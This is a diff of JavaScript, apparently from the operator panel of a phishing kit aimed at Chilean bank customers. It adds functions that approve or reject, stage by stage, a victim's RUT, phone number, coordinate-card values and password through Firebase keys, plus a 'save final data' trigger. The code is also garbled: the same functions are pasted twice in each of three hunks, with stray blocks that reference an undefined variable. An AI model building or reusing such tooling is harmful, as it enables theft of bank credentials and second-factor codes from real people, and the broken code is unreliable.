@@ -35,13 +35,55 @@
       ref.set(correcto ? "siguiente" : "error");
     }
     
-    function validarGeneral(esCorrecto) {
+    function validarEtapa(etapa) {
+      let estado = "";
+      switch(etapa) {
+        case "rut":
+        case "telefono":
+        case "coordenadas":
+        case "clave":
+          estado = "siguiente";
+          break;
+        case "error":
+          estado = "error";
+          break;
+      }
+      console.log("✅ Etapa:", etapa, "→", estado);
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+
+    function guardarFinal() {
+      console.log("💾 Guardando datos finales");
+      firebase.database().ref("guardar_final").set("guardar");
+    } {
       const estado = esCorrecto ? "siguiente" : "error";
+      console.log("✅ Enviando validacion_estado:", estado);
       firebase.database().ref("validacion_estado").set(estado);
     }
     
-    function validarGeneral(esCorrecto) {
+    function validarEtapa(etapa) {
+      let estado = "";
+      switch(etapa) {
+        case "rut":
+        case "telefono":
+        case "coordenadas":
+        case "clave":
+          estado = "siguiente";
+          break;
+        case "error":
+          estado = "error";
+          break;
+      }
+      console.log("✅ Etapa:", etapa, "→", estado);
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+
+    function guardarFinal() {
+      console.log("💾 Guardando datos finales");
+      firebase.database().ref("guardar_final").set("guardar");
+    } {
       const estado = esCorrecto ? "siguiente" : "error";
+      console.log("✅ Enviando validacion_estado:", estado);
       firebase.database().ref("validacion_estado").set(estado);
     }
 
@@ -98,13 +140,55 @@
       ref.set(correcto ? "siguiente" : "error");
     }
     
-    function validarGeneral(esCorrecto) {
+    function validarEtapa(etapa) {
+      let estado = "";
+      switch(etapa) {
+        case "rut":
+        case "telefono":
+        case "coordenadas":
+        case "clave":
+          estado = "siguiente";
+          break;
+        case "error":
+          estado = "error";
+          break;
+      }
+      console.log("✅ Etapa:", etapa, "→", estado);
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+
+    function guardarFinal() {
+      console.log("💾 Guardando datos finales");
+      firebase.database().ref("guardar_final").set("guardar");
+    } {
       const estado = esCorrecto ? "siguiente" : "error";
+      console.log("✅ Enviando validacion_estado:", estado);
       firebase.database().ref("validacion_estado").set(estado);
     }
     
-    function validarGeneral(esCorrecto) {
+    function validarEtapa(etapa) {
+      let estado = "";
+      switch(etapa) {
+        case "rut":
+        case "telefono":
+        case "coordenadas":
+        case "clave":
+          estado = "siguiente";
+          break;
+        case "error":
+          estado = "error";
+          break;
+      }
+      console.log("✅ Etapa:", etapa, "→", estado);
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+
+    function guardarFinal() {
+      console.log("💾 Guardando datos finales");
+      firebase.database().ref("guardar_final").set("guardar");
+    } {
       const estado = esCorrecto ? "siguiente" : "error";
+      console.log("✅ Enviando validacion_estado:", estado);
       firebase.database().ref("validacion_estado").set(estado);
     }
 
@@ -310,13 +394,55 @@
       ref.set(correcto ? "siguiente" : "error");
     }
     
-    function validarGeneral(esCorrecto) {
+    function validarEtapa(etapa) {
+      let estado = "";
+      switch(etapa) {
+        case "rut":
+        case "telefono":
+        case "coordenadas":
+        case "clave":
+          estado = "siguiente";
+          break;
+        case "error":
+          estado = "error";
+          break;
+      }
+      console.log("✅ Etapa:", etapa, "→", estado);
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+
+    function guardarFinal() {
+      console.log("💾 Guardando datos finales");
+      firebase.database().ref("guardar_final").set("guardar");
+    } {
       const estado = esCorrecto ? "siguiente" : "error";
+      console.log("✅ Enviando validacion_estado:", estado);
       firebase.database().ref("validacion_estado").set(estado);
     }
     
-    function validarGeneral(esCorrecto) {
+    function validarEtapa(etapa) {
+      let estado = "";
+      switch(etapa) {
+        case "rut":
+        case "telefono":
+        case "coordenadas":
+        case "clave":
+          estado = "siguiente";
+          break;
+        case "error":
+          estado = "error";
+          break;
+      }
+      console.log("✅ Etapa:", etapa, "→", estado);
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+
+    function guardarFinal() {
+      console.log("💾 Guardando datos finales");
+      firebase.database().ref("guardar_final").set("guardar");
+    } {
       const estado = esCorrecto ? "siguiente" : "error";
+      console.log("✅ Enviando validacion_estado:", estado);
       firebase.database().ref("validacion_estado").set(estado);
     }
 
